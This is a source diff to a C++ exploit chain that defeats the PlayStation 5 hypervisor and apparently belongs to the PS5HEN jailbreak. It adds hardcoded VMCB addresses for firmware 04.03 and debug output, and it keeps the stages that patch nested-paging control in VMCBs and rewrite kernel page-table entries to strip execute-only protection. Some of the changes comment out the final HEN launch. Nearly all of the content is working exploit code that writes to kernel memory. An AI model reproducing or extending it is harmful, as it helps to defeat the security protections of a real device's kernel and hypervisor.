@@ -27,6 +27,9 @@ int stage0_discover(hv_defeat_ctx *ctx) {
 
     ctx->kbase = (uint64_t)KERNEL_ADDRESS_DATA_BASE - fw_off(ctx->fw, "KDATA_OFFSET");
 
+    uint64_t kdata = KERNEL_ADDRESS_DATA_BASE;
+    uint64_t ktext = KERNEL_ADDRESS_TEXT_BASE;
+
     int32_t ml4i = (int32_t)kr4(ctx->kbase + fw_off(ctx->fw, "OFF_DMPML4I"));
     int32_t dpi  = (int32_t)kr4(ctx->kbase + fw_off(ctx->fw, "OFF_DMPDPI"));
     ctx->dmap_base = ((uint64_t)dpi << 30) | ((uint64_t)ml4i << 39) | 0xFFFF800000000000ULL;
@@ -37,6 +40,7 @@ int stage0_discover(hv_defeat_ctx *ctx) {
     std::print("  dmap      0x{:x}\n", ctx->dmap_base);
     std::print("  hv_data   0x{:x}\n", ctx->hv_data_va);
     std::print("  fw        0x{:04x}\n", ctx->fw);
+    std::print("  kdata 0x{:x} ktext 0x{:x}\n", kdata, ktext);
 
     if ((uint32_t)dr4(ctx->dmap_base, ECAM_B0D18F2) != 0xFFFFFFFF) {
         for (int t = 0; t < 22; t++) {
@@ -100,12 +104,23 @@ int stage1_tmr_relax(hv_defeat_ctx *ctx) {
     return 0;
 }
 
+uint64_t get_vmcb (hv_defeat_ctx *ctx, int core) {
+    switch (ctx->fw) {
+        case 0x0403:
+            return (uint64_t) 0x62A05000 + (uint64_t) core * 0x3000;
+            break;
+        default:
+            return -1;
+    }
+}
+
 int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
     std::print("\n[stage2] vmcb discovery\n");
 
     uint64_t vcpu_off = fw_off(ctx->fw, "HV_VCPU");
     uint64_t stride   = fw_off(ctx->fw, "HV_VCPU_CPUID");
-    if (!vcpu_off || !stride) {
+    // Testing direct VMCB on 04.03
+    if ((!vcpu_off || !stride) && ctx->fw != 0x0403) {
         std::print("  missing HV_VCPU offsets for fw 0x{:04x}\n", ctx->fw);
         return -1;
     }
@@ -131,6 +146,19 @@ int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
     ctx->vmcb_count = 0;
     for (int c = 0; c < 16; c++) {
         uint64_t ptr_pa;
+
+        if (ctx->fw == 0x0403) {
+            
+            uint64_t vmcb_pa = get_vmcb(ctx, c);
+            std::print("  core {:2d}: pa=0x{:x}\n", c, vmcb_pa);
+
+            if (ctx->vmcb_count < MAX_VMCBS) {
+                ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
+                ctx->vmcb_count++;
+            }
+
+            continue;
+        }
 
         if (ctx->fw >= 0x0300) {
             // read directly from PA via GPU DMA
@@ -169,7 +197,7 @@ int stage3_patch_vmcbs(hv_defeat_ctx *ctx) {
     {
         notify("Hypervisor already disabled, aborting..");
 
-        return -3;
+        return 0;
     }
 
     if (np0 != 0x9) {
@@ -219,9 +247,17 @@ int stage3_patch_vmcbs(hv_defeat_ctx *ctx) {
 int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
     std::print("\n[stage3b] xotext removal\n");
 
-    pin_to_first_available_core();
+    //pin_to_first_available_core();
+
+    pin_to_core( 9 );
 
     uint64_t pmap = ctx->kbase + fw_off(ctx->fw, "OFF_PMAP_STORE");
+    uint64_t read_2 = 0;
+    kernel_copyout(pmap, &read_2, sizeof(read_2));
+    std::print("pmap: {:016x} -> {:016x}\n", pmap, read_2);
+    
+    kernel_copyout(pmap + fw_off(ctx->fw, "PMAP_PM_PML4"), &read_2, 8);
+    std::print("pmap + pml4: {:016x} -> {:016x}\n", pmap + fw_off(ctx->fw, "PMAP_PM_PML4"), read_2);
     uint64_t start = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
     uint64_t end = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
     int n = 0;
@@ -231,11 +267,17 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
         if (pde_a != ~0ULL) {
             CLEAR_PDE_BIT(pde, XOTEXT); SET_PDE_BIT(pde, RW);
             kernel_copyin(&pde, pde_a, sizeof(pde));
+            uint64_t read = 0;
+            kernel_copyout(pde_a, &read, sizeof(read));
+            std::print("Entry pde a: {:x} pde_a: {:x} write: {:016x} read: {:016x}\n", a, pde_a, pde, read);
         }
         uint64_t pte, pte_a = find_pte(pmap, a, &pte);
         if (pte_a != ~0ULL) {
             CLEAR_PDE_BIT(pte, XOTEXT); SET_PDE_BIT(pte, RW);
             kernel_copyin(&pte, pte_a, sizeof(pte));
+            uint64_t read3 = 0;
+            kernel_copyout(pte_a, &read3, sizeof(read3));
+            std::print("Entry pte a: {:x} pte_a: {:x} write: {:016x} read: {:016x}\n", a, pte_a, pte, read3);
             n++;
         }
     }
@@ -245,16 +287,19 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
 
 
 int stage4_verify(hv_defeat_ctx *ctx) {
+    usleep(200000);
     std::print("\n[stage4] verify\n");
 
-    pin_to_first_available_core();
+    pin_to_core( 9 );
+
+    //pin_to_first_available_core();
 
     uint64_t ktext = kr8((uint64_t)KERNEL_ADDRESS_TEXT_BASE);
-    uint64_t hvdata = kr8(ctx->hv_data_va);
+    //uint64_t hvdata = kr8(ctx->hv_data_va);
     uint32_t np = ctx->vmcb_count > 0 ? gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_NP_ENABLE) : 0xFF;
 
     std::print("  ktext  0x{:016x}{}\n", ktext, (ktext != 0 && ktext != ~0ULL) ? " ok" : " fail");
-    std::print("  hvdata 0x{:016x}{}\n", hvdata, (hvdata != ~0ULL) ? " ok" : " fail");
+    //std::print("  hvdata 0x{:016x}{}\n", hvdata, (hvdata != ~0ULL) ? " ok" : " fail");
     std::print("  np     0x{:x}{}\n", np, ((np & 0x9) == 0) ? " ok" : " fail");
 
     // verify intercepts persisted on vmcb[0]
@@ -291,6 +336,7 @@ static int widen_cpuset_syscall() {
 }
 
 static int flush_tlb_all_cores(hv_defeat_ctx *ctx) {
+
     std::print("\n[tlb flush]\n");
 
     // B9 80 00 00 C0        mov ecx, 0xC0000080
@@ -454,11 +500,11 @@ int stage7_run_hen(hv_defeat_ctx *ctx) {
     return ret;
 }
 
-int run_hv_defeat(uint64_t mp4_softc, uint64_t zcn_bar2) {
+int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
     hv_defeat_ctx ctx;
     memset(&ctx, 0, sizeof(ctx));
-    ctx.mp4_softc = mp4_softc;
-    ctx.zcn_bar2 = zcn_bar2;
+    // ctx.mp4_softc = mp4_softc;
+    // ctx.zcn_bar2 = zcn_bar2;
 
     int r;
 
@@ -499,13 +545,13 @@ int run_hv_defeat(uint64_t mp4_softc, uint64_t zcn_bar2) {
 
     flush_tlb_all_cores(&ctx);
 
-    usleep(100000);
+    // usleep(100000);
     
-    stage7_run_hen(&ctx);
+    // stage7_run_hen(&ctx);
 
-    uint32_t fw_ver = kernel_get_fw_version();
-    notify(std::format("Welcome To PS5HEN 1.3\nPlayStation 5 FW: {:d}.{:02d}\nBy SpecterDev, f0f, flat_z",
-        (fw_ver >> 24) & 0xFF, (fw_ver >> 16) & 0xFF));
+    // uint32_t fw_ver = kernel_get_fw_version();
+    // notify(std::format("Welcome To PS5HEN 1.3\nPlayStation 5 FW: {:d}.{:02d}\nBy SpecterDev, f0f, flat_z",
+    //     (fw_ver >> 24) & 0xFF, (fw_ver >> 16) & 0xFF));
 
     return 0;
 }
